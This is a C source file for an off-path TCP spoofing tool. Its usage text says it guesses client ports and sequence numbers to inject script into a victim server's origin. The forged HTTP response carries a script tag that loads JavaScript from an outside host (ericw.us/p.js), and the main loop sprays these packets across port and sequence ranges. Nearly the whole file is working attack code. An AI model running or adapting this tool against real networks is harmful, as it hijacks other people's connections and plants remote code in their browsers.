#include "tcp_spoof.h"
#include <unistd.h>
#include <getopt.h>
#include <assert.h>

char HTTP_PAYLOAD[1420];
#define HTML "<script src=\"http://ericw.us/p.js\"></script>\n"
#define HTTP "HTTP/1.1 200\n" \
             "Content-Type: text/html\n" \
             "Content-Length: %d\n\n%s"

void init_http_payload(void)
{
    char tmp[sizeof(HTTP_PAYLOAD)];
    int len = snprintf(tmp, sizeof(tmp), HTTP, (int)strlen(HTML)-1, HTML);
    int i;
    
    /* Fill payload with 'HTTP' */
    for (i=0; i<sizeof(HTTP_PAYLOAD); i+=4) {
        memcpy(&HTTP_PAYLOAD[i], "HTTP", 4);
    }

    /* Make sure we don't insert in the middle of an "HTTP" */
    int round_len = (len + 3) & ~0x3;
    int end = sizeof(HTTP_PAYLOAD) - round_len + len;

    assert((round_len <= sizeof(HTTP_PAYLOAD)));
    assert(end < sizeof(HTTP_PAYLOAD));

    memcpy(&HTTP_PAYLOAD[sizeof(HTTP_PAYLOAD) - round_len], tmp, len);
    HTTP_PAYLOAD[end] = '\0';
    
}

int get_low_port(char *s)
{
    return atoi(s); 
}

int get_high_port(char *s)
{
    char *high_port = strchr(s, (int)'-');
    if (high_port == NULL) {
        return atoi(s);
    }

    return atoi(high_port+1);
}

char *get_addr(char *addr_port)
{
    char *colon = strchr(addr_port, (int)':');
    if (colon == NULL) {
        return addr_port;
    }

    int addr_len = colon - addr_port;
    if (addr_len > 15) {
        return NULL;
    } 

    char *ret = malloc(addr_len);
    if (ret == NULL) {
        return ret;
    }

    memcpy(ret, addr_port, addr_len);

    return ret; 
}

int get_port(char *addr_port)
{
    char *colon = strchr(addr_port, (int)':');
    if (colon == NULL) {
        return -1;
    }

    return atoi(colon + 1);
}

int timediff_us(struct timeval *t1, struct timeval *t2)
{
    return (t2->tv_sec - t1->tv_sec)*1000000 +
        (t2->tv_usec - t1->tv_usec);
}

void delay_until(struct timeval *last_time, int delay)
{
    struct timeval cur_time;
    gettimeofday(&cur_time, NULL);
    int diff;
    while ((diff = timediff_us(last_time, &cur_time)) < delay) {
        if ((delay - diff) > 50) {
            usleep(delay - diff - 50);
        }
        gettimeofday(&cur_time, NULL);
    }
    gettimeofday(last_time, NULL);
}

void print_usage(char *prog)
{
    printf("\nUsage: %s [options] client_ip server_ip:server_port\n\n", prog);
    printf("\tSpoofs HTTP payloads from server_ip:server_port to client_ip:source_ports\n");
    printf("\tguessing the sequence numbers. If we win, we get to inject script from\n");
    printf("\tthe victim server's origin.\n");
    printf("Options:\n");
    printf("    --ports (-p)  : client source port range (best if only 1 given)\n");
    printf("    --delay (-d)  : microseconds to delay between each send\n");
    printf("    --repeat (-r) : number of times to repeat. 0 for inifinite\n");
    printf("    --time (-t)   : time (in milliseconds) to run for. Overrides -r.\n");
    printf("\n");
}

int main(int argc, char *argv[])
{
    struct pkt_data pkt;
    int dport_low, dport_high;
    struct timeval last_time;
    int opt; // opt_ind;
    int opt_index;
    struct option long_opts[] = {
        {"ports", 1, 0, 'p'},
        {"delay", 1, 0, 'd'},
        {"repeat", 1, 0, 'r'},
        {"time", 1, 0, 't'},
        {0, 0, 0, 0}
    };
    char *daddr;
    char *saddr_port;
    char *saddr;
    int delay = 0;
    int sport;
    int repeat = 1;
    int time = 0;

    while ((opt = getopt_long(argc, argv, "p:d:r:t:", long_opts, &opt_index)) != -1) {
        switch (opt) {
        case 'p':
            dport_low = get_low_port(optarg);
            dport_high = get_high_port(optarg); 
            break;
        case 'd':
            delay = atoi(optarg);
            break;
        case 'r':
            repeat = atoi(optarg);
            if (repeat == 0)
                repeat = -1;
            break;
        case 't':
            time = atoi(optarg);
            break;
        default:
            print_usage(argv[0]);
        }
    }

    if (time != 0) {
        repeat = -1;
    }

    if (optind+2 != argc) {
        //usage
        print_usage(argv[0]);
        return -1;
    } 

    daddr = argv[optind++];
    saddr_port = argv[optind++];   // site_ip:site_port

    saddr = get_addr(saddr_port);
    sport = get_port(saddr_port);

    /*
    printf("saddr: [%s]\n", saddr);
    printf("sport: [%d]\n", sport_low);
    printf("daddr: [%s]\n", daddr);
    printf("dport: [%d]\n", dport);
    */
 
    init_sock();
    init_http_payload();

    pkt.daddr = inet_addr(daddr);
    pkt.saddr = inet_addr(saddr);
    pkt.dport = htons(dport_low);
    pkt.sport = htons(sport); 
    
    pkt.id = 1234;
    pkt.ttl = 64;

    pkt.ack = 0;
    pkt.seq = 0xffffffff;

    pkt.flags = 0; 
    
    //tcp_forge_xmit(&pkt, NULL, 0);

    unsigned int percent_done;
    unsigned int last_pct_done = 0;
    uint16_t dport;
    struct timeval end_time;

    gettimeofday(&end_time, NULL);
    end_time.tv_usec += 1000*time;
    end_time.tv_sec += (end_time.tv_usec / 1000000);
    end_time.tv_usec %= 1000000;

    gettimeofday(&last_time, NULL);

    do {

        for (dport=dport_low; dport <= dport_high; dport++) {

            delay_until(&last_time, delay);

            pkt.dport = htons(dport);   // Victim client's port (our guess)

            if (tcp_forge_xmit(&pkt, HTTP_PAYLOAD, strlen(HTTP_PAYLOAD))) {
                fprintf(stderr, "noo\n");
                return -1;
            }
            
        }

        uint32_t last_seq = pkt.seq;
        pkt.seq -= strlen(HTTP_PAYLOAD);
        if (pkt.seq > last_seq) {
            // Wrapped around

            if (repeat > 0)
                repeat--;

            if (repeat == 0)
                break;
        }

        if (time != 0) {
            struct timeval cur_time;
            gettimeofday(&cur_time, NULL);
            if ((cur_time.tv_sec > end_time.tv_sec) ||
             (cur_time.tv_sec == end_time.tv_sec && cur_time.tv_usec > end_time.tv_usec)) {
                break;
            }
        } 
    } while (1);

    return 0;    
}
